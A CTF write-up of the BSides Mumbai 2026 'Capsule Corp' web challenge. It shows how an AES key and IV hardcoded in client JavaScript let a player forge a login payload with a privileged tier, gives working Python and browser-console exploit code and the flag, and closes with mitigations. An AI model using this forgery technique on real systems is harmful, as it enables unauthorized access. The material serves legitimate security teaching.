---
link: "writeups/bsides-mumbai-2026/capsule-corp-operations-console"
title: "BSides Mumbai CTF 2026: Capsule Corp Operations Console Writeup"
description: "A writeup for the Capsule Corp Operations Console Web challenge from BSides Mumbai 2026, exploiting client-side trust and exposed AES keys."
date: 2026-10-01 14:30:00
categories:
  - [Writeups, BSides Mumbai CTF]
tags:
  - Web Exploitation
  - Cryptography
  - Broken Access Control
  - AES-CBC
---

# BSides Mumbai CTF — Capsule Corp Operations Console

## Challenge Description

> Dr. Briefs has deployed a state-of-the-art operations console to safeguard Capsule
> Corporation's proprietary blueprints against Red Ribbon espionage. Only senior
> engineering staff hold clearance to view the classified research archives.

**URL:** `http://35.238.206.98:6767/`

---

## Step 1 — Reconnaissance

Opening the challenge URL reveals a Dragon Ball Z–themed operations console with four tabs:

- **Dragon Radar** — Interactive radar with 7 Dragon Ball blips
- **Gravity Chamber** — Gravity simulation controller
- **Dyna-Capsules** — Capsule decompression bay
- **Clearance Terminal** ← **This is the target**

![Homepage](/img/posts/bsides-mumbai-2026-01_homepage.webp)

The page loads several JavaScript bundles worth examining:

```plain
assets/runtime.a3f8d.js
assets/chunk.9e2b1.js
assets/app.min.js
assets/validators.min.js
```

---

## Step 2 — Clearance Terminal

Switching to the **Clearance Terminal** tab reveals a login form asking for an **Operator ID** and **Security Clearance Key**.

![Clearance Terminal Login Form](/img/posts/bsides-mumbai-2026-02_clearance_terminal.webp)

Attempts with common credentials all return `401 UNAUTHORIZED`. Time to dig into the JS.

---

## Step 3 — JavaScript Source Analysis

### `assets/runtime.a3f8d.js` — Hardcoded AES-256 Key

The runtime file stores the encryption key in an obfuscated form:

```js
var _kp1 = "sbaL_proCeluspaC"; // reversed string
var _ka = [84, 51, 99, 104, 75, 51, 121, 35]; // char codes
var _kb = [57, 109, 80, 113, 50, 119, 88, 122]; // char codes

function _r(s) {
  return s.split("").reverse().join("");
}

// Assembled at runtime via _gk():
//   _r("sbaL_proCeluspaC")   → "CapsuleCorp_Labs"
//   fromCharCode(..._ka)      → "T3chK3y#"
//   fromCharCode(..._kb)      → "9mPq2wXz"
//   full key                  → "CapsuleCorp_LabsT3chK3y#9mPq2wXz"

t.__cc_rt = {
  _gk: function () {
    return _r(_kp1) + String.fromCharCode.apply(null, _ka.concat(_kb));
  },
};
```

**Recovered AES-256 Key:** `CapsuleCorp_LabsT3chK3y#9mPq2wXz` _(32 bytes)_

---

### `assets/chunk.9e2b1.js` — API Client, IV & Tier Map

```js
// IV stored as base64
var _ib = "Q2Fwc3VsZUNvcnBJVl8yNg==";
// atob(...) → "CapsuleCorpIV_26"  (16 bytes)

// Privilege tier map — note the special value: maintenance = -2
var _T = { standard:0, operator:1, supervisor:2, restricted:3, maintenance:-2 };

// Auth payload builder — frontend ALWAYS sends tier:1, __priv:0
async function _mkPayload(username, password) {
  var obj = {
    username:    username,
    password:    password,
    tier:        1,               // hardcoded operator tier
    access_mode: "standard",
    __priv:      _T["standard"]  // hardcoded 0
  };
  return await _xe(JSON.stringify(obj), _gk(), _gi()); // AES-CBC encrypt
}

// API auth call → POST /api/session
auth: async function(u, p) {
  return await _post("/api/session", { payload: await _mkPayload(u, p) });
}
```

**Recovered IV:** `CapsuleCorpIV_26` _(16 bytes)_  
**Auth Endpoint:** `POST /api/session`

---

## Step 4 — Vulnerability Analysis

The authentication scheme has a **critical design flaw**:

> **The server trusts the `tier` and `__priv` values embedded inside the client-encrypted AES payload.**

This breaks down into three compounding issues:

| #   | Issue                                                          | CWE     |
| --- | -------------------------------------------------------------- | ------- |
| 1   | AES-256 key and IV are hardcoded in client-side JS             | CWE-321 |
| 2   | Server uses client-supplied `tier`/`__priv` for access control | CWE-284 |
| 3   | IV is static and reused across every request                   | CWE-330 |

Because the attacker has the key and IV, they can craft **any** AES-encrypted payload with
arbitrary privilege values. The `maintenance: -2` tier acts as a privileged bypass that
the server grants engineering-level access to.

**OWASP:** A01:2021 Broken Access Control + A02:2021 Cryptographic Failures

---

## Step 5 — Exploit

### Python Script

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, json, urllib.request

KEY = b'CapsuleCorp_LabsT3chK3y#9mPq2wXz'   # 32 bytes — AES-256
IV  = b'CapsuleCorpIV_26'                     # 16 bytes

def encrypt_payload(obj):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    ct = cipher.encrypt(pad(json.dumps(obj).encode(), 16))
    s = ''.join(chr(b) for b in ct)
    return base64.b64encode(s.encode('latin-1')).decode()

# Craft payload with maintenance tier (-2)
malicious = {
    'username':    'maintenance',
    'password':    'maintenance',
    'tier':        -2,
    'access_mode': 'maintenance',
    '__priv':      -2
}

payload = encrypt_payload(malicious)

req = urllib.request.Request(
    'http://35.238.206.98:6767/api/session',
    data=json.dumps({'payload': payload}).encode(),
    headers={
        'Content-Type':     'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    },
    method='POST'
)

with urllib.request.urlopen(req) as r:
    print(r.read().decode())
```

**Server Response:**

```json
{
  "status": "authenticated",
  "role": "engineering",
  "session": "e296b3eb46172cd3c524e39e533cd75d5033765f6a91b62e7b61879ff91e0176",
  "data": {
    "user": {
      "id": "cc-eng-1",
      "display": "Engineering Access",
      "tier": 99
    },
    "workspace": "capsulecorp-engineering",
    "access_token": "BSides_Mumbai{c4psul3_c0rp_3ng_0v3rr1d3_4es_cbc_pr1v_m1nus_tw0}",
    "expires_in": 3600
  }
}
```

---

### Browser Console One-liner

> **Note:** `crypto.subtle` requires HTTPS. Load CryptoJS via CDN first on this HTTP target.

```javascript
// Step 1 — load CryptoJS
var s = document.createElement("script");
s.src =
  "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
document.head.appendChild(s);

// Step 2 — run after ~1s
(async () => {
  const KEY = CryptoJS.enc.Utf8.parse("CapsuleCorp_LabsT3chK3y#9mPq2wXz");
  const IV = CryptoJS.enc.Utf8.parse("CapsuleCorpIV_26");
  const pt = JSON.stringify({
    username: "maintenance",
    password: "maintenance",
    tier: -2,
    access_mode: "maintenance",
    __priv: -2,
  });
  const enc = CryptoJS.AES.encrypt(pt, KEY, {
    iv: IV,
    mode: CryptoJS.mode.CBC,
  });
  const payload = enc.toString();
  const res = await fetch("/api/session", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Requested-With": "XMLHttpRequest",
    },
    body: JSON.stringify({ payload }),
  });
  console.log(JSON.stringify(await res.json(), null, 2));
})();
```

![Exploit running in browser console](/img/posts/bsides-mumbai-2026-03_exploit_console.webp)

---

## Step 6 — Flag

![Flag in console output](/img/posts/bsides-mumbai-2026-04_flag_output.webp)

```plain
BSides_Mumbai{c4psul3_c0rp_3ng_0v3rr1d3_4es_cbc_pr1v_m1nus_tw0}
```

---

## Mitigations

| Vulnerability                                 | Recommended Fix                                                                                          |
| --------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| Hardcoded AES key in JS                       | Never embed crypto secrets client-side; sign tokens server-side (e.g. JWT with server-only secret)       |
| Server trusts client-supplied `tier`/`__priv` | Look up privilege **only** from server DB after credential validation; ignore all role claims in payload |
| Fixed IV (`CapsuleCorpIV_26`)                 | Generate a random 16-byte IV per request and prepend it to the ciphertext                                |
| `maintenance:-2` bypass tier                  | Remove special tiers from the client payload schema; handle all role assignment server-side              |
| No credential validation on unknown users     | Reject unrecognized usernames with 401 regardless of embedded tier value                                 |

---

## Summary

The vulnerability is a classic **client-side trust / broken access control** bug. The app
uses AES-CBC to "protect" the login payload, but the encryption keys are fully exposed in
the JavaScript source. More critically, the server grants access based on the `tier` value
_inside_ the encrypted payload rather than its own database — meaning anyone who reverses
the JS (trivially easy) can claim any privilege level they want.

---
